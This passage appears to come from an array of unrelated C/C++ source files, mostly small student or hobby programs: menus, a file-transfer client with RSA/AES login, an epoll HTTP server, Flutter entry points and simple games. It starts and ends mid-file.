\u0423\u0441\u043b\u043e\u0436\u043d\u0435\u043d\u0438\u0435\n\tstd::cout << \"\u0417\u0430\u0434\u0430\u0447\u0430 2.\\n\";\n\tint operation;\n\tdo {\n\t\tstd::cout << \"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u0435:\\n\";\n\t\tstd::cout << \"1. \u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u0441\u0442\u0430\u0442\u0438\u0441\u0442\u0438\u043a\u0443 \u0432 \u0444\u0430\u0439\u043b;\\n\";\n\t\tstd::cout << \"2. \u0412\u044b\u0432\u0435\u0441\u0442\u0438 \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u043c\u043e\u0435 \u0444\u0430\u0439\u043b\u0430;\\n\";\n\t\tstd::cout << \"3. \u041e\u0447\u0438\u0441\u0442\u0438\u0442\u044c \u0444\u0430\u0439\u043b;\\n\";\n\t\tstd::cout << \"4. \u0417\u0430\u0432\u0435\u0440\u0448\u0438\u0442\u044c \u0440\u0430\u0431\u043e\u0442\u0443;\\n\";\n\t\tstd::cout << \"\u0412\u0432\u043e\u0434 -> \";\n\t\tstd::cin >> operation;\n\n\t\tswitch (operation) {\n\t\tcase 1: {\n\t\t\tstd::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0441\u0442\u0440\u043e\u043a\u0443 -> \";\n\t\t\tstd::string str2;\n\t\t\tstd::cin.ignore();\n\t\t\tstd::getline(std::cin, str2);\n\t\t\tstatistic(str2);\n\t\t\tstd::cout << \"\u0421\u0442\u0430\u0442\u0438\u0441\u0442\u0438\u043a\u0430 \u0432\u043d\u0435\u0441\u0435\u043d\u0430.\\n\\n\";\n\t\t\tbreak;\n\t\t}\n\t\tcase 2:\n\t\t\tstd::cout << \"\u0421\u043e\u0434\u0435\u0440\u0436\u0438\u043c\u043e\u0435 \u0444\u0430\u0439\u043b\u0430:\\n\";\n\t\t\tprint_file(\"stats.txt\");\n\t\t\tbreak;\n\t\tcase 3:\n\t\t\tstd::cout << \"\u0412\u044b \u0443\u0432\u0435\u0440\u0435\u043d\u044b, \u0447\u0442\u043e \u0445\u043e\u0442\u0438\u0442\u0435 \u043e\u0447\u0438\u0441\u0442\u0438\u0442\u044c \u0444\u0430\u0439\u043b? (y/n)\\n\";\n\t\t\tchar answer;\n\t\t\tstd::cin >> answer;\n\t\t\tif (answer == 'y') {\n\t\t\t\tclear_file(\"stats.txt\");\n\t\t\t\tstd::cout << \"\u0424\u0430\u0439\u043b \u043e\u0447\u0438\u0449\u0435\u043d.\\n\\n\";\n\t\t\t}\n\t\t\telse\n\t\t\t\tstd::cout << \"\u041e\u0442\u043c\u0435\u043d\u0430 \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u0438.\\n\\n\";\n\t\t\tbreak;\n\n\t\tcase 4:\n\t\t\tstd::cout << \"\u0417\u0430\u0432\u0435\u0440\u0448\u0435\u043d\u0438\u0435 \u0440\u0430\u0431\u043e\u0442\u044b...\\n\";\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tstd::cout << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u0432\u0432\u043e\u0434\u0430!\\n\\n\";\n\t\t}\n\n\t} while (operation != 4);\n\n\n\treturn 0;\n}",
    "\n\n#include \"client.h\"\n\n#pragma pack(push,1)\n\n\n\nClient::Client():\n\tclient_version(CLIENT_VERSION), requestSenderAndReciever() {\n\tread_me_info();\n}\n\nvoid Client::read_transfer_info() {\n\tstd::ifstream transfer_info_file(\"transfer.info\");\n\tif (transfer_info_file.is_open()) {\n\t\tstd::string line;\n\t\tstd::getline(transfer_info_file, line); //first line is host and port, not relevant to this layer\n\t\tstd::string client_name;\n\t\tstd::getline(transfer_info_file, client_name);\n\t\ttransfer_info_file.close();\n\t\tif (!this->registered) { //if registered: the client name has been read from me.info\n\t\t\tthis->client_name = client_name;\n\t\t\tthis->client_id = std::string(16, '0'); //some default\n\t\t}\n\t}\n\telse {\n\t\tthrow std::runtime_error(\"\\ntransfer.info file is missing\\n\");\n\t}\n}\n\nvoid Client::read_me_info() {\n\tstd::ifstream client_info_file(\"me.info\");\n\tstd::string client_info;\n\tstd::string client_id_hex;\n\tif (client_info_file.is_open()) {\n\t\tthis->registered = true;\n\t\tstd::getline(client_info_file, this->client_name);\n\t\tclient_info += \"\\nName: \" + this->client_name + \"\\n\";\n\t\tstd::getline(client_info_file, client_id_hex);\n\t\tclient_info += \"\\nID: \" + client_id_hex + \"\\n\";\n\t\tthis->client_id = Encoder::dehexify(client_id_hex);\n\t\tstd::cout << \"\\nme.info file exists\\n\";\n\t\tstd::cout << \"\\nClient's information: \\n\" << client_info;\n\t\tstd::cout << \"\\nMoving to login request...\\n\";\n\t\tclient_info_file.close();\n\t}\n\telse {\n\t\tthis->registered = false;\n\t\tstd::cout << \"\\nme.info file doesn't exist\\n\";\n\t\tstd::cout << \"\\nMoving to registration request...\\n\";\n\t}\n}\n\n\n\n\nstd::string Client::generate_RSA_pair() {\n\tstd::cout << \"\\nGenerating RSA keys...\\n\";\n\tRSAPrivateWrapper rsapriv;\n\tstd::string base64key = Encoder::b64encode(rsapriv.getPrivateKey());\n\tstd::ofstream private_key_file(\"priv.key\");\n\tif (private_key_file.is_open()) {\n\t\tprivate_key_file << base64key;\n\t\tprivate_key_file.close();\n\t}\n\n\telse {\n\t\tthrow std::runtime_error(\"\\nError opening private key file for writing\\n\");\n\t}\n\n\tstd::ofstream client_info_file(\"me.info\", std::ios::app);\n\tif (client_info_file.is_open()) {\n\t\tclient_info_file << base64key;\n\t\tclient_info_file.close();\n\t}\n\telse {\n\t\tthrow std::runtime_error(\"\\nError opening me.info file for writing\\n\");\n\t}\n\n\tstd::cout << \"\\nDone\\n\";\n\tstd::cout << \"----------------------------------------\\n\";\n\treturn rsapriv.getPublicKey();\n}\n\n\nstd::string Client::encrypt_with_aes(std::string plain_text) {\n\tAESWrapper aes(this->aes_key.c_str(), this->aes_key.length());\n\tstd::string cipher_text = aes.encrypt(plain_text.c_str(), plain_text.length());\n\treturn cipher_text;\n}\n\n\n// requests\n\nvoid Client::send_registration_request() {\n\tstd::cout << \"\\nSending registration request\\n\";\n\tstd::string response_status = \"\";\n\tread_transfer_info();\n\tfor (uint8_t trial = 0; trial < NUM_OF_TRIALS;  trial++) {\n\t\trequestSenderAndReciever.send_registration_request(this->client_name, this->client_id, this->client_version);\n\t\tResponseHeader header = requestSenderAndReciever.accept_header();\n\t\tresponse_status = statusCodes[header.code];\n\t\tif (response_status != \"registration_success\")\n\t\t\tstd::cerr << \"\\nserver responded with an error\\n\";\n\t\telse {\n\t\t\tstd::cout << \"\\nRegistration accepted\\n\";\n\t\t\taccept_registration();\n\t\t\tstd::cout << \"----------------------------------------\\n\";\n\t\t\treturn;\n\t\t}\n\t}\n\tthrow std::runtime_error(\"\\nFATAL: server has reponded with \"+response_status+\"\\n\");\n}\n\n\nuint32_t Client::send_login_request() {\n\tstd::cout << \"\\nSending login request\\n\";\n\tstd::string response_status = \"\";\n\tfor (uint8_t trial = 0; trial < NUM_OF_TRIALS; trial++) {\n\t\trequestSenderAndReciever.send_login_request(this->client_name, this->client_id, this->client_version);\n\t\tResponseHeader header = requestSenderAndReciever.accept_header();\n\t\tresponse_status = statusCodes[header.code];\n\t\tstd::cout << \"\\nResponse message: \" << response_status << \"\\n\";\n\t\tif (response_status == \"login_rejected\") {\n\t\t\tstd::cerr << \"\\nlogin rejected by server, switching to registration...\\n\";\n\t\t\tstd::cout << \"----------------------------------------\\n\";\n\t\t\tthis->registered = false; \n\t\t\trequestSenderAndReciever.accept_login_failed();\n\t\t\treturn 0;\n\t\t}\n\t\tif (response_status != \"login_ok_sending_AES\")\n\t\t\tstd::cerr << \"\\nServer responded with an error\\n\";\n\n\t\telse {\n\t\t\tstd::cout << \"\\nLogin accepted by server\\n\";\n\t\t\tstd::cout << \"----------------------------------------\\n\";\n\t\t\treturn header.payload_size;\n\t\t}\n\t}\n\tthrow std::runtime_error(\"\\nFATAL: server has reponded with \" + response_status + \"\\n\");\n\t//return 0;\n}\n\n\nuint32_t Client::send_public_key() {\n\tstd::string public_key = generate_RSA_pair();\n\tstd::cout << \"\\nSending public key\\n\";\n\tstd::string response_status = \"\";\n\tfor (uint8_t trial = 0; trial < NUM_OF_TRIALS; trial++) {\n\t\trequestSenderAndReciever.send_public_key(this->client_name, public_key, this->client_id, this->client_version);\n\t\tResponseHeader header = requestSenderAndReciever.accept_header();\n\t\tresponse_status = statusCodes[header.code];\n\t\n\t\tstd::cout << \"\\nResponse message: \" << response_status << \"\\n\";\n\t\ti",
    "/*\n * Copyright (c) 2015 Enrico M. Crisostomo\n *\n * This program is free software; you can redistribute it and/or modify it under\n * the terms of the GNU General Public License as published by the Free Software\n * Foundation; either version 3, or (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful, but WITHOUT\n * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS\n * FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more\n * details.\n *\n * You should have received a copy of the GNU General Public License along with\n * this program.  If not, see <http://www.gnu.org/licenses/>.\n */\n#include <libfswatch/libfswatch_config.h>\n#include \"libfswatch/c++/windows/win_paths.hpp\"\n#include \"libfswatch/c++/libfswatch_exception.hpp\"\n\n#include <locale>\n#include <codecvt>\n\nusing namespace std;\n\nnamespace fsw\n{\n  namespace win_paths\n  {\n    \n    wstring posix_to_win_w(string path)\n    {\n      wstring_convert<codecvt_utf8_utf16<wchar_t>> _UTF_Converter;\n      wstring result = _UTF_Converter.from_bytes(path);\n      for (wchar_t& c : result) {\n        if (c == L'/') {\n          c = L'\\\\';\n        }\n      }\n      return result;\n    }\n\n    string win_w_to_posix(wstring path)\n    {\n      wstring_convert<codecvt_utf8_utf16<wchar_t>> _UTF_Converter;\n      string result = _UTF_Converter.to_bytes(path);\n      for (char& c : result) {\n        if (c == '\\\\') {\n          c = '/';\n        }\n      }\n      return result;\n    }\n  }\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_application_task13\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"storage_item.h\"\n#include <fstream>\n#include <iostream>\n#include <string>\n#include <ctime>\n#include <stdexcept>\n\nusing namespace std;\nextern int VERSION;\n\nStorageItem::StorageItem(string textInput) {\n    version = VERSION;\n    timesReturned = 0;\n    timeLastSurfaced = time(nullptr);\n    text = textInput;\n}\n\nint StorageItem::getVersion() { return version; }\n\nint StorageItem::getTimesReturned() { return timesReturned; }\n\ntime_t StorageItem::getTimeLastSurfaced() { return timeLastSurfaced; }\n\nstring StorageItem::getText() { \n    return text; \n}\n\nvoid StorageItem::serialize(const string& filename) {\n    // Create an ofstream instance and open the file\n    ofstream f(filename, ios::binary | ios::app);\n\n    // Check if the file was opened successfully\n    if (f.is_open()) {\n        // Test text\n        f.write(\"Helloworld!\", 11);\n        // Write the version number\n        int version = getVersion();\n        cout << \"version is \" << version << endl;\n        cout << \"size is \" << sizeof version << endl;\n        f.write(reinterpret_cast<char*>(&version), sizeof version);\n        f.flush();\n    //     f.write(reinterpret_cast<char*>(timesReturned), sizeof(int));\n    //     f.write(reinterpret_cast<char*>(timeLastSurfaced), sizeof(time_t));\n    //     // first write the size of the string for deserialization\n    //     int textLength = getText().length();\n    //     cout << \"text length is \" << textLength << endl;\n    //     f.write(reinterpret_cast<char*>(textLength), sizeof(unsigned long));\n    //     f.write(getText().c_str(), textLength);\n    //     // Close the file\n        f.close();\n    // } else {\n    //     // If the file could not be opened, print an error message\n    //     cerr << \"Unable to open file: \" << filename << endl;\n    }\n}\n",
    "#include <iostream>\r\n#include <algorithm>\r\n#include <string>\r\n\r\nusing namespace std;\r\n\r\n// Fungsi binary search untuk mencari huruf dalam string\r\nint binarySearch(const string &str, char target)\r\n{\r\n    int left = 0;\r\n    int right = str.length() - 1;\r\n    while (left <= right)\r\n    {\r\n        int mid = left + (right - left) / 2;\r\n        if (str[mid] == target)\r\n        {\r\n            return mid; // huruf ditemukan\r\n        }\r\n        else if (str[mid] < target)\r\n        {\r\n            left = mid + 1;\r\n        }\r\n        else\r\n        {\r\n            right = mid - 1;\r\n        }\r\n    }\r\n    return -1; // huruf tidak ditemukan\r\n}\r\n\r\nint main()\r\n{\r\n    string kalimat;\r\n    char huruf;\r\n    \r\n    // Input kalimat\r\n    cout << \"Masukkan kalimat: \";\r\n    getline(cin, kalimat);\r\n    \r\n    // Mengurutkan kalimat terlebih dahulu agar binary search dapat bekerja\r\n    sort(kalimat.begin(), kalimat.end());\r\n    \r\n    // Input huruf yang dicari\r\n    cout << \"Masukkan huruf yang ingin dicari: \";\r\n    cin >> huruf;\r\n    \r\n    // Melakukan binary search pada kalimat\r\n    int posisi = binarySearch(kalimat, huruf);\r\n    \r\n    // Mengecek apakah huruf ditemukan atau tidak\r\n    if (posisi != -1)\r\n    {\r\n        cout << \"Huruf \\\"\" << huruf << \"\\\" ditemukan pada posisi \" << posisi + 1 << \" dari kalimat.\" << endl;\r\n    }\r\n    else\r\n    {\r\n        cout << \"Huruf \\\"\" << huruf << \"\\\" tidak ditemukan dalam kalimat.\" << endl;\r\n    }\r\n    \r\n    return 0;\r\n}\r\n",
    "#include \"Map_Database_Group.h\"\n\nMap_Database_Group::Map_Database_Group() {\n\n}\n\nMap_Database_Group::~Map_Database_Group() {\n    if (Map_Database_Group_User_Set != nullptr) {\n        delete Map_Database_Group_User_Set;\n    }\n}\n\nvoid Map_Database_Group::set_group_id(int group_id) {\n    this->group_id = group_id;\n};\n\nint Map_Database_Group::get_group_id() const {\n    return group_id;\n};\n\nset<Map_Database_Group_User> *Map_Database_Group::get_Map_Database_Group_User_Set() const {\n    return Map_Database_Group_User_Set;\n};\n\nvoid Map_Database_Group::set_Map_Database_Group_User_Set(set<Map_Database_Group_User> *Map_Database_Group_User_Set) {\n    this->Map_Database_Group_User_Set = Map_Database_Group_User_Set;\n};\n\nbool Map_Database_Group::operator==(const Map_Database_Group &other) const {\n    return group_id == other.group_id;\n}\n\nbool Map_Database_Group::operator<(const Map_Database_Group &other) const {\n    return group_id < other.group_id;\n}\n\nbool Map_Database_Group::operator>(const Map_Database_Group &other) const {\n    return group_id > other.group_id;\n}\n",
    "#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <errno.h>\n#include <string.h>\n#include <fcntl.h>\n#include <stdlib.h>\n#include <sys/epoll.h>\n#include \"locker.h\"\n#include \"threadpool.h\"\n#include \"http_conn.h\"\n\n#define MAX_FD 65536   // \u6700\u5927\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u4e2a\u6570\n#define MAX_EVENT_NUMBER 10000  // \u76d1\u542c\u7684\u6700\u5927\u7684\u4e8b\u4ef6\u6570\u91cf\n\n// \u6dfb\u52a0\u6587\u4ef6\u63cf\u8ff0\u7b26\nextern void addfd( int epollfd, int fd, bool one_shot );\nextern void removefd( int epollfd, int fd );\n\nvoid addsig(int sig, void( handler )(int)){\n    struct sigaction sa;\n    memset( &sa, '\\0', sizeof( sa ) );\n    sa.sa_handler = handler;\n    sigfillset( &sa.sa_mask );\n    assert( sigaction( sig, &sa, NULL ) != -1 );\n}\n\nint main( int argc, char* argv[] ) {\n    \n    if( argc <= 1 ) {\n        printf( \"usage: %s port_number\\n\", basename(argv[0]));\n        return 1;\n    }\n\n    int port = atoi( argv[1] );\n    addsig( SIGPIPE, SIG_IGN );\n\n    threadpool< http_conn >* pool = NULL;\n    try {\n        pool = new threadpool<http_conn>;\n    } catch( ... ) {\n        return 1;\n    }\n\n    http_conn* users = new http_conn[ MAX_FD ];\n\n    int listenfd = socket( PF_INET, SOCK_STREAM, 0 );\n\n    int ret = 0;\n    struct sockaddr_in address;\n    address.sin_addr.s_addr = INADDR_ANY;\n    address.sin_family = AF_INET;\n    address.sin_port = htons( port );\n\n    // \u7aef\u53e3\u590d\u7528\n    int reuse = 1;\n    setsockopt( listenfd, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof( reuse ) );\n    ret = bind( listenfd, ( struct sockaddr* )&address, sizeof( address ) );\n    ret = listen( listenfd, 5 );\n\n    // \u521b\u5efaepoll\u5bf9\u8c61\uff0c\u548c\u4e8b\u4ef6\u6570\u7ec4\uff0c\u6dfb\u52a0\n    epoll_event events[ MAX_EVENT_NUMBER ];\n    int epollfd = epoll_create( 5 );\n    // \u6dfb\u52a0\u5230epoll\u5bf9\u8c61\u4e2d\n    addfd( epollfd, listenfd, false );\n    http_conn::m_epollfd = epollfd;\n\n    while(true) {\n        \n        int number = epoll_wait( epollfd, events, MAX_EVENT_NUMBER, -1 );\n        \n        if ( ( number < 0 ) && ( errno != EINTR ) ) {\n            printf( \"epoll failure\\n\" );\n            break;\n        }\n\n        for ( int i = 0; i < number; i++ ) {\n            \n            int sockfd = events[i].data.fd;\n            \n            if( sockfd == listenfd ) {\n                \n                struct sockaddr_in client_address;\n                socklen_t client_addrlength = sizeof( client_address );\n                int connfd = accept( listenfd, ( struct sockaddr* )&client_address, &client_addrlength );\n                \n                if ( connfd < 0 ) {\n                    printf( \"errno is: %d\\n\", errno );\n                    continue;\n                } \n\n                if( http_conn::m_user_count >= MAX_FD ) {\n                    close(connfd);\n                    continue;\n                }\n                users[connfd].init( connfd, client_address);\n\n            } else if( events[i].events & ( EPOLLRDHUP | EPOLLHUP | EPOLLERR ) ) {\n\n                users[sockfd].close_conn();\n\n            } else if(events[i].events & EPOLLIN) {\n\n                if(users[sockfd].read()) {\n                    pool->append(users + sockfd);\n                } else {\n                    users[sockfd].close_conn();\n                }\n\n            }  else if( events[i].events & EPOLLOUT ) {\n\n                if( !users[sockfd].write() ) {\n                    users[sockfd].close_conn();\n                }\n\n            }\n        }\n    }\n    \n    close( epollfd );\n    close( listenfd );\n    delete [] users;\n    delete pool;\n    return 0;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"todo_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include<iostream>\nusing namespace std;\nbool insert( const char*  password)\n\n{\n    bool flag_4 = false; \n    bool flag_1 = false;\n    bool flag_2 = false;\n    bool flag_3 = false;\n\n    int i=0;\n    for( i=0;*(password+i)!='\\0';i++)\n    {\n    }\n        if(i<6)\n        {\n            cout<<\"You have entered too short password\\n\";\n        }\n\n\n    for(int  j=0;*(password+j)!='\\0';j++)\n    {\n        if(*(password+j)>=65&&*(password+j)<=90)\n        {\n            flag_1 = true;\n           \n        }\n        else if(*(password+j)>=97&&*(password+j)<=122)\n        {\n            flag_2 = true;\n            \n        }\n        else if(*(password+j)>='0' && *(password+j)<='9')\n        {\n            flag_3 = true;\n           \n        }\n    }cout<<endl;\n\n    if(flag_1 == true && flag_2 == true && flag_3 == true)\n    {\n        cout<<\" --> you have entered correct password\\n\";\n    }\n    else\n    {\n        cout<<\"incorrect ::---:: not according to the requirements \\n\";\n    }\n    if(flag_1 != true )\n    {\n        cout<<\" --> uppercase letters missing\\n\";\n    }\n    if(flag_2 != true)\n    {\n        cout<<\" --> lowercase letters missing\\n\";\n    }\n    if(flag_3 != true)\n    {\n        cout<<\" --> Digit  missing\\n\";\n    }\n    cout<<\"______________________\\n\";\n    cout<<\"______________________\\n\";\nreturn flag_4;\n}\nint main()\n{\n    //allocating memory to the char ptr\n    char*  const password = new char;\n    cout<<\"______________________\\n\";\n    cout<<\"[ ENTER THE PASSWORD ] ===\\t\";\n    //Taking input from user \n    cin>>password;\n    cout<<\"______________________\\n\";\n    //passing arguments to the funtion having const char *ptr\n    insert(password);\n    // deallocating memory\n    delete []password;\n    return 0;\n}",
    "#include <Arduino.h>\n#include \"Plong.h\"\n\nPlong::Plong(Display& display_instance, Ball& ball_instance, Paddle& paddle_instnace) \n    : display(display_instance), ball(ball_instance), paddle(paddle_instnace){\n\n    game_state = false;\n\n    paddle.setResolutionWidth(display.res_x);\n}\n\nvoid Plong::Start()\n{\n\n    display.Animation_Game_Over_Mode(1);\n    //TODO: remove;\n    game_state = true;\n\n//     ball.setPosition(display.middleX(), display.middleY());\n//     ball.setStartingDirection();\n    //CurrentState = Play;  //Need to be added in main - overleg met PIOTR.\n}\n\nvoid Plong::iterate(){\n\n    ball.move();\n    int paddle_scored = ball.bounce(display, paddle);\n\n    //0 = Bounced, 1 = P1 scored, 2 = p2 scored\n    if(paddle_scored){\n\n        //TODO: Implement game state & score\n        Start();\n    }\n\n    visualise();\n}\n\nvoid Plong::visualise(){\n    \n    //Set led stated of each component\n    display.visualiseBall(ball.pos_x, ball.pos_y);\n    display.visualizePaddle(paddle.getPosX1(), paddle.getPosX2(), paddle.width);\n\n    //Display the leds\n    display.displayLeds();\n}\n\nvoid Plong::consoleVisualisation(){\n    Serial.print(\"X: \");\n    Serial.print(ball.pos_x);\n    Serial.print(\" Y: \");\n    Serial.print(ball.pos_y);\n    Serial.print(\" Direction:\");\n    Serial.print(ball.direction);\n    Serial.println(\" \");\n\n    // Print the top border\n    for (int i = 0; i < display.res_x + 2; i++) {\n        Serial.print(\"-\");\n    }\n    Serial.println();\n\n    for (int y = 0; y < display.res_y; y++) {\n        Serial.print(\"|\");\n\n        for (int x = 0; x < display.res_x; x++) {\n            if (ball.pos_x >= (x * 100) && ball.pos_x < ((x + 1) * 100) &&\n                ball.pos_y >= (y * 100) && ball.pos_y < ((y + 1) * 100)) {\n                Serial.print(\"*\");\n            } else {\n                Serial.print(\" \");\n            }\n        }\n\n        Serial.println(\"|\");\n    }\n\n    // Print the bottom border\n    for (int i = 0; i < display.res_x + 2; i++) {\n        Serial.print(\"-\");\n    }\n    Serial.println();\n}",
    "#include <cstdlib>\n#include <ctime>\n\n#include \"gamewin.h\"\n#include \"data.h\"\n#include \"scenes/title.h\"\n#include \"scenes/main.h\"\n#include \"scenes/rank.h\"\n#include\"engine/MusicSprite.h\"\n#include\"SDL_mixer.h\"\n#include<iostream>\nusing namespace std;\n\n\nint main(int argc, char *argv[]) {\n    // initialize random seed\n    std::srand(std::time(nullptr));\n    GameData::LoadData();//\u8f7d\u5165\u6570\u636e\n    // load resources\n    GameWindow game;//\u521b\u5efa\u4e00\u4e2aGameWindow\u7c7b\u7684\u5bf9\u8c61\uff0c\u7528\u6765\u521d\u59cb\u5316\u754c\u9762\n    if (Mix_OpenAudio(44100, MIX_DEFAULT_FORMAT, 2, 1024) != 0) {\n        cout << \"Failed to open audio: \" << Mix_GetError() << endl;\n    }\n    auto resman = game.CreateResManager();//\u521b\u5efa\u4e00\u4e2aResManager\u7c7b\u7684\u5bf9\u8c61\n    resman.LoadImages();\n    resman.LoadBACKGroundMusics();\n    resman.LoadSounds();\n    resman.LoadFont(\"demofont\", \"res/sample.ttf\");\n    // init scene\n    auto title = std::make_shared<TitleScene>(game.sceneman(), resman);//\u521b\u5efa\u521d\u59cb\u80cc\u666f\n    auto title_id = game.sceneman().AddScene(title);//\u5c06\u521d\u59cb\u80cc\u666f\u52a0\u5165\n    auto game_main = std::make_shared<MainScene>(game.sceneman(), resman);//\u521b\u5efa\u6e38\u620f\u4e3b\u9898\u573a\u666f\n    auto main_id = game.sceneman().AddScene(game_main);//\u5c06\u6e38\u620f\u4e3b\u9898\u573a\u666f\u52a0\u5165\n    auto rank = std::make_shared<RankScene>(game.sceneman(), resman);//\u521b\u5efa\u6e38\u620f\u7ed3\u675f\u573a\u666f\n    auto rank_id = game.sceneman().AddScene(rank);//\u5c06\u6e38\u620f\u7ed3\u675f\u573a\u666f\u52a0\u5165\n    title->set_main_id(main_id);//\u6e38\u620f\u4e3b\u9898\u573a\u666f\u7684main_id_\u503c\u662f1\n    game_main->set_rank_id(rank_id);//\u6e38\u620f\u7ed3\u675f\u573a\u666f\u7684main_id_\u503c\u662f2\n    game_main->set_title_id(title_id);//\n    rank->set_title_id(title_id);\n    game.sceneman().SwitchScene(title_id);//\u5c06\u573a\u666f\u8bbe\u7f6e\u4e3a\u521d\u59cb\u573a\u666f\n    // main loop\n    game.MainLoop();//\u6e38\u620f\u5faa\u73af\n    // save game data\n    GameData::SaveData();//\u4fdd\u5b58\u6570\u636e\n    return 0;\n}\n",
    "#include<iostream>\n#include<math.h>\n#include<string>\n\nusing namespace std;\n\nint main () {\n    \n    string d , e , f , k;\n    \n    cout<<\"Bienvenido al Casino Ganamucho.\"<<endl;\n    cout<<\"Quieres lanzar el primer dado? S / N\"<<endl;\n    cin>>d;\n    \n    int a , b , c , g , h , l;\n    \n    \n    srand (time(NULL));\n    a = 1 + rand() % 6;\n    b = 1 + rand() % 6;\n    g = 1 + rand() % 6;\n    h = 1 + rand() % 6;\n    \n    l = g + h;\n    if (d == \"S\" or d == \"s\") {\n        cout<<\"El resultado del primer dado es \"<<a<<endl;}\n        \n    else if (d == \"N\" or d == \"n\") {\n        cout<<\"Entiendo. Aunque asi no funciona el juego\"<<endl;}\n    else {cout<<\"Caracter invalido.\";}\n    \ncout<<\"Quieres lanzar el segundo dado? S / N\"<<endl;\ncin>>e;\n    if (e == \"S\" or e == \"s\") {\n        cout<<\"El resultado del segundo dado es \"<<b<<endl;\n        \n    }\n    else if (e == \"N\" or e == \"n\") {\n        cout<<\"Entiendo. Aunque asi no funciona el juego.\";}\n    else {cout<<\"Caracter invalido.\";}\n\nc = a + b ;\n    cout<<\"Sacaste \"<<c<<endl;\n    if (c == 2 or c == 3 or c == 12 ) {\n        cout<<\"Perdiste. Sacaste: \"<<c<<endl;\n    }\n    else if (c == 7 or c == 11){\n        cout<<\"Ganaste! Sacaste:\"<<c<<endl;\n    }\n    else {cout<<\"Continuas con la fase dos, estas listo? S / N\";\n          cin>>f;\n        if (f == \"S\" or f == \"s\") {\n            cout<<\"El valor del dado 1 es de :\"<<g<<\", el valor del dado 2 es de: \"<<h<<\". El valor final de los dados es de\"<<l<<endl;\n            if (l == c) {\n                cout<<\"Ganaste! El resultado del lanzamiento es de:\" ;\n            }\n            else if (l == 7) {\n                cout<<\"Perdiste.\";\n            }\n            else if (l != 7 or l != c){\n                cout<<\"Repite el lanzamiento, tienes 3 intentos mas.\";\n                cout<<\"Enter para continuar.\";\n                cin>>k;\n                g = 1 + rand() % 6;\n                h = 1 + rand() % 6;\n                l = g + h ;\n                cout<<\"El valor del dado 1 es de :\"<<g<<\", el valor del dado 2 es de: \"<<h<<\". El valor final de los dados es de\"<<l<<endl;\n\n                if (l == c) {\n                cout<<\"Ganaste!\";}\n                else if (l == 7) {\n                cout<<\"Perdiste.\";}\n                else if (l != 7 or l != c){\n                    cout<<\"Repite el lanzamiento, tienes 2 intentos mas.\";\n                    cout<<\"Enter para continuar.\";\n                    cin>>k;\n\n                    g = 1 + rand() % 6;\n                    h = 1 + rand() % 6;\n                    l = g + h ;\n                    cout<<\"El valor del dado 1 es de :\"<<g<<\", el valor del dado 2 es de: \"<<h<<\". El valor final de los dados es de\"<<l<<endl;\n                    cout<<\"Enter para continuar.\";\n                    cin>>k;\n                    cin>>k;\n                    \n                    if (l == c) {\n                    cout<<\"Ganaste!\";}\n                    else if (l == 7) {\n                    cout<<\"Perdiste.\";}\n                    else if (l != 7 or l != c){\n                        cout<<\"Repite el lanzamiento, tienes 1 intentos mas.\";\n                        cout<<\"Enter para continuar.\";\n                        cin>>k;                        \n                        g = 1 + rand() % 6;\n                        h = 1 + rand() % 6;\n                        l = g + h 